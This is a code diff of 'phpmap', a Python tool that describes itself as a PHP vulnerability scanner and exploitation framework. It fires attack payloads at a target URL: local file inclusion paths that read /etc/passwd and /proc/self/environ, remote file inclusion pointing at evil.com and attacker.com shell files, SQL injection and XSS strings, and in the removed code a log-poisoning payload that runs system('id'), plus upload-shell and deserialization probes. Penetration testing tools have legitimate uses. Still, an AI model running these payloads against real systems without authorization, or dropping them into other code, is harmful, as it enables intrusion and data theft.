@@ -1,176 +1,160 @@
 #!/usr/bin/env python3
 
-"""
-phpmap - PHP Vulnerability Scanner
-Version: 1.0.0
-Author: MQZ
-License: Apache 2.0
-"""
-
 import argparse
 import requests
-import sys
-import urllib.parse
 import re
+import sys
+import threading
 
 __version__ = "1.0.0"
 
+BANNER = """
+ ____  _   _ ____  __  __    _    ____  
+|  _ \| | | |  _ \|  \/  |  / \  |  _ \ 
+| |_) | | | | |_) | |\/| | / _ \ | |_) |
+|  __/| |_| |  __/| |  | |/ ___ \|  __/ 
+|_|    \___/|_|   |_|  |_/_/   \_\_|    
+                                        
+PHPMap v1.0.0 - PHP Vulnerability Scanner
+"""
 
-class PhpMap:
-    def __init__(self, url):
-        self.url = url if url.startswith("http") else f"http://{url}"
-        self.session = requests.Session()
+parser = argparse.ArgumentParser(description="phpmap - PHP vulnerability scanner and exploitation framework")
+parser.add_argument("-u", "--url", help="Target URL")
+parser.add_argument("--lfi", help="Run Local File Inclusion scanner", action="store_true")
+parser.add_argument("--rfi", help="Run Remote File Inclusion scanner", action="store_true")
+parser.add_argument("--upload-bypass", help="Run Upload Bypass Scanner (coming soon)", action="store_true")
+parser.add_argument("--deserialization", help="Run PHP Deserialization scanner (coming soon)", action="store_true")
+parser.add_argument("--sql-injection", help="Run SQL Injection scanner", action="store_true")
+parser.add_argument("--xss", help="Run Cross-Site Scripting (XSS) scanner", action="store_true")
+parser.add_argument("--dir-listing", help="Check for open directory listings", action="store_true")
+parser.add_argument("--backup-files", help="Scan for backup/config files", action="store_true")
+parser.add_argument("--admin-finder", help="Bruteforce common admin paths", action="store_true")
+parser.add_argument("--phpinfo", help="Check for public phpinfo page", action="store_true")
+parser.add_argument("--version", action="version", version=f"phpmap {__version__}")
 
-    def check_lfi(self):
-        print("[*] Running LFI scanner...")
-        payloads = [
-            "../../../../../../../../etc/passwd",
-            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
-        ]
+example = '''
+Example usage:
+  python3 phpmap.py -u http://target.com/index.php --lfi
+  python3 phpmap.py -u http://target.com/index.php --rfi
+  python3 phpmap.py -u http://target.com/index.php --sql-injection
+  python3 phpmap.py -u http://target.com/index.php --admin-finder
+'''
+parser.epilog = example
 
-        for payload in payloads:
-            parsed_url = urllib.parse.urlparse(self.url)
-            query = urllib.parse.parse_qs(parsed_url.query)
-            for param in query:
-                original = query[param][0]
-                query[param][0] = payload
-                new_query = urllib.parse.urlencode(query, doseq=True)
-                target = self.url.split("?")[0] + "?" + new_query
-                try:
-                    res = self.session.get(target, timeout=5)
-                    if "root:x:" in res.text or "[extensions]" in res.text:
-                        print(f"[+] LFI detected: {target}")
-                    else:
-                        print(f"[-] Not vulnerable: {target}")
-                except requests.RequestException:
-                    print(f"[!] Request failed: {target}")
-                query[param][0] = original
+args = parser.parse_args()
 
-    def check_rfi(self):
-        print("[*] Running RFI scanner...")
-        payloads = [
-            "http://evil.com/shell.txt",
-            "https://attacker.com/malicious.txt",
-        ]
+if not args.url:
+    parser.print_help()
+    sys.exit(1)
 
-        parsed_url = urllib.parse.urlparse(self.url)
-        query = urllib.parse.parse_qs(parsed_url.query)
-        for param in query:
-            original = query[param][0]
-            for payload in payloads:
-                query[param][0] = payload
-                new_query = urllib.parse.urlencode(query, doseq=True)
-                target = self.url.split("?")[0] + "?" + new_query
-                try:
-                    res = self.session.get(target, timeout=5)
-                    if "shell" in res.text.lower() or "malicious" in res.text.lower():
-                        print(f"[+] RFI vulnerability detected: {target}")
-                    else:
-                        print(f"[-] Not vulnerable: {target}")
-                except requests.RequestException:
-                    print(f"[!] Request failed: {target}")
-                query[param][0] = original
+url = args.url
 
-    def check_upload_bypass(self):
-        print("[*] Running Upload Bypass scanner...")
-        test_url = self.url
-        files = {
-            "file": ("shell.php", "<?php echo 'Upload test'; ?>", "application/x-php")
-        }
+
+def lfi_scanner(target_url):
+    lfi_payloads = [
+        "../../../../../../../../etc/passwd",
+        "../../../../../../../../proc/self/environ",
+        "../../../../../../../../boot.ini",
+        "../../../../../../../../windows/win.ini"
+    ]
+    for payload in lfi_payloads:
+        test_url = f"{target_url}{payload}"
         try:
-            res = self.session.post(test_url, files=files, timeout=5)
-            if res.status_code in [200, 201] and "Upload test" in res.text:
-                print(f"[+] Upload bypass may be possible at: {test_url}")
-            else:
-                print(f"[-] Upload bypass not detected at: {test_url}")
-        except requests.RequestException:
-            print(f"[!] Upload request failed: {test_url}")
+            r = requests.get(test_url)
+            if "root:x:" in r.text or "[boot loader]" in r.text:
+                print(f"[+] LFI detected: {test_url}")
+        except:
+            continue
 
-    def check_deserialization(self):
-        print("[*] Running PHP Deserialization scanner...")
-        payload = "O:8:\"Exploit\":0:{}"
-        parsed_url = urllib.parse.urlparse(self.url)
-        query = urllib.parse.parse_qs(parsed_url.query)
-        for param in query:
-            original = query[param][0]
-            query[param][0] = payload
-            new_query = urllib.parse.urlencode(query, doseq=True)
-            target = self.url.split("?")[0] + "?" + new_query
-            try:
-                res = self.session.get(target, timeout=5)
-                if "error" in res.text.lower() or "exception" in res.text.lower():
-                    print(f"[+] Possible PHP deserialization detected: {target}")
-                else:
-                    print(f"[-] Not vulnerable to deserialization: {target}")
-            except requests.RequestException:
-                print(f"[!] Request failed: {target}")
-            query[param][0] = original
 
-    def check_eval_injection(self):
-        print("[*] Running Eval Injection scanner...")
-        payload = "phpinfo();"
-        parsed_url = urllib.parse.urlparse(self.url)
-        query = urllib.parse.parse_qs(parsed_url.query)
-        for param in query:
-            original = query[param][0]
-            query[param][0] = payload
-            new_query = urllib.parse.urlencode(query, doseq=True)
-            target = self.url.split("?")[0] + "?" + new_query
-            try:
-                res = self.session.get(target, timeout=5)
-                if "phpinfo" in res.text.lower():
-                    print(f"[+] Eval injection detected: {target}")
-                else:
-                    print(f"[-] Not vulnerable to eval injection: {target}")
-            except requests.RequestException:
-                print(f"[!] Request failed: {target}")
-            query[param][0] = original
+def rfi_scanner(target_url):
+    payload = "http://evil.com/shell.txt"
+    test_url = f"{target_url}{payload}"
+    try:
+        r = requests.get(test_url)
+        if "shell" in r.text.lower():
+            print(f"[+] RFI detected: {test_url}")
+    except:
+        pass
 
-    def check_log_poisoning(self):
-        print("[*] Running Log Poisoning check...")
-        headers = {
-            "User-Agent": "<?php system('id'); ?>"
-        }
+
+def sql_injection_scanner(target_url):
+    payloads = ["'", "' or '1'='1", '" or "1"="1']
+    for payload in payloads:
+        test_url = f"{target_url}{payload}"
         try:
-            res = self.session.get(self.url, headers=headers, timeout=5)
-            if res.status_code == 200:
-                print(f"[+] Log poisoning payload sent to: {self.url}")
-            else:
-                print(f"[-] Unable to determine log poisoning potential: {self.url}")
-        except requests.RequestException:
-            print(f"[!] Log poisoning request failed: {self.url}")
-
-    def run(self, args):
-        if args.lfi:
-            self.check_lfi()
-        if args.rfi:
-            self.check_rfi()
-        if args.upload_bypass:
-            self.check_upload_bypass()
-        if args.deserialization:
-            self.check_deserialization()
-        if args.eval:
-            self.check_eval_injection()
-        if args.log_poison:
-            self.check_log_poisoning()
+            r = requests.get(test_url)
+            if "sql" in r.text.lower() or "syntax" in r.text.lower():
+                print(f"[+] Possible SQL Injection: {test_url}")
+        except:
+            continue
 
 
-def main():
-    parser = argparse.ArgumentParser(description="phpmap - PHP Vulnerability Scanner")
-    parser.add_argument("-u", "--url", required=True, help="Target URL")
-    parser.add_argument("--lfi", action="store_true", help="Run LFI scanner")
-    parser.add_argument("--rfi", action="store_true", help="Run RFI scanner")
-    parser.add_argument("--upload-bypass", action="store_true", help="Scan for file upload bypasses")
-    parser.add_argument("--deserialization", action="store_true", help="Scan for PHP deserialization flaws")
-    parser.add_argument("--eval", action="store_true", help="Scan for eval injection flaws")
-    parser.add_argument("--log-poison", action="store_true", help="Scan for log poisoning flaws")
-    parser.add_argument("--version", action="version", version=f"phpmap {__version__}")
-
-    args = parser.parse_args()
-
-    scanner = PhpMap(args.url)
-    scanner.run(args)
+def xss_scanner(target_url):
+    payload = "<script>alert('xss')</script>"
+    test_url = f"{target_url}{payload}"
+    try:
+        r = requests.get(test_url)
+        if payload in r.text:
+            print(f"[+] XSS detected: {test_url}")
+    except:
+        pass
 
 
-if __name__ == "__main__":
-    main()
+def directory_listing_check(target_url):
+    try:
+        r = requests.get(target_url)
+        if "Index of /" in r.text:
+            print(f"[+] Directory listing enabled: {target_url}")
+    except:
+        pass
+
+
+def backup_file_check(target_url):
+    files = ["config.php.bak", "index.php~", "wp-config.php.swp"]
+    for f in files:
+        try:
+            r = requests.get(f"{target_url}/{f}")
+            if r.status_code == 200:
+                print(f"[+] Possible backup file found: {f}")
+        except:
+            continue
+
+
+def admin_finder(target_url):
+    paths = ["/admin", "/admin/login.php", "/cpanel", "/dashboard"]
+    for path in paths:
+        try:
+            r = requests.get(f"{target_url.rstrip('/')}{path}")
+            if r.status_code == 200:
+                print(f"[+] Admin panel found: {path}")
+        except:
+            continue
+
+
+def phpinfo_check(target_url):
+    try:
+        r = requests.get(f"{target_url}/phpinfo.php")
+        if "phpinfo()" in r.text:
+            print(f"[+] Public phpinfo() page detected: {target_url}/phpinfo.php")
+    except:
+        pass
+
+print(BANNER)
+
+if args.lfi:
+    lfi_scanner(url)
+if args.rfi:
+    rfi_scanner(url)
+if args.sql_injection:
+    sql_injection_scanner(url)
+if args.xss:
+    xss_scanner(url)
+if args.dir_listing:
+    directory_listing_check(url)
+if args.backup_files:
+    backup_file_check(url)
+if args.admin_finder:
+    admin_finder(url)
+if args.phpinfo:
+    phpinfo_check(url)
